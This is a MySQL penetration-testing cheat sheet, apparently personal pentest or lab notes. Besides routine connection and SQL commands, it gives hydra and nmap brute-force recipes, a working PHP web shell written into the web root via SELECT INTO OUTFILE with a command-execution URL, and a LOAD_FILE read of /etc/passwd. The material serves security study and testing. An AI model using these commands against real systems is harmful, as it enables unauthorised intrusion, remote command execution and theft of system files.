**MySQL** is a widely used open-source relational database management system (RDBMS). It is known for its speed, reliability, and ease of use. MySQL is commonly used in web applications and supports powerful querying through SQL. It communicates over **TCP port 3306** by default and can be accessed locally or remotely.

---

## Enumerating MySQL 

### Detect MySQL service and version

```bash
nmap -p 3306 --script mysql-info <target>
```

### Brute-force MySQL login
```bash
hydra -l <username> -P <password_list> mysql://<target_ip>:3306
```

or

```bash
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```


---

## Connecting Remotely to MySQL

```bash
mysql -u username -p -h <host> -P 3306
```

- `-h`: Host IP or domain
- `-P`: Port (default is 3306)

> If you receive the following error: `ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`, use the flag `--ssl=0` at the end of the command. 

---

## Starting MySQL Locally (Kali or Linux)

### Start MySQL service

```bash
sudo service mysql start
```

### Access MySQL shell

```bash
mysql -u root -p
```

- `-u root`: Username
- `-p`: Prompts for password

---

## Importing a MySQL Dump

If you have a `.sql` file:

```bash
mysql -u root -p
CREATE DATABASE db_name;
EXIT;
mysql -u root -p db_name < database.sql
```

---

## Common SQL Commands

- **List all databases**:

```sql
SHOW DATABASES;
```

- **Select a database**:

```sql
USE db_name;
```

- **List all tables**:

```sql
SHOW TABLES;
```

- **Describe a table**:

```sql
DESCRIBE table_name;
```

- **Show table schema**:

```sql
SHOW CREATE TABLE table_name;
```

- **Query all data from a table**:

```sql
SELECT * FROM table_name;
```

- **Search with condition**:

```sql
SELECT * FROM users WHERE age = 30;
```

- **Exit MySQL shell**:

```sql
EXIT;
```



---

## Write Local Files (Command Execution via Web Root)

If MySQL runs on a web server (e.g., PHP), and we have the proper privileges, we can achieve command execution by writing a web shell into the web root directory using `SELECT INTO OUTFILE`.

If the file is written successfully, we can access it through the browser and execute system commands.

### Requirements

- `FILE` privilege
    
- Write permissions on target directory
    
- `secure_file_priv` must allow file operations
    

Check privileges:

```sql
SHOW GRANTS FOR CURRENT_USER();
```

Check restriction:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Possible values:

- `''` → No restriction (read/write allowed anywhere)
    
- `/path/` → Only allowed inside that directory
    
- `NULL` → File operations disabled

### Write Web Shell

```sql
SELECT "<?php echo shell_exec($_GET['c']); ?>" 
INTO OUTFILE '/var/www/html/webshell.php';
```

If successful:

```
Query OK, 1 row affected
```

Execute commands:

```
http://target/webshell.php?c=id
```


---

## Read Local Files

By default, MySQL does not allow arbitrary file reading. However, if the user has the `FILE` privilege and `secure_file_priv` does not restrict access, local files can be read using `LOAD_FILE()`.

### Requirements

- `FILE` privilege
    
- Read permissions on target file
    
- `secure_file_priv` allows access
    

Check restriction:
```
SHOW VARIABLES LIKE 'secure_file_priv';
```

Read a file:

```
SELECT LOAD_FILE('/etc/passwd');
```